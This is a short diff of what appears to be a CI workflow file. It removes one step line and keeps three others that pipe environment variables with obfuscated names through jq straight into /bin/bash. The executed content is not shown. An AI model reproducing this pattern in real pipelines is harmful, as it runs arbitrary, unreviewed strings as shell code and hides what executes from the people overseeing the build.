@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$fsc077" | jq -r .oibmx0 | /bin/bash
           printf '%s' "$dscyo05857" | jq -r .kqcql77682 | /bin/bash
-          echo $burxy2 | jq -r .jtb2274 | /bin/bash
           echo $td92 | jq -r .wist03585 | /bin/bash
 
       - name: Archive results
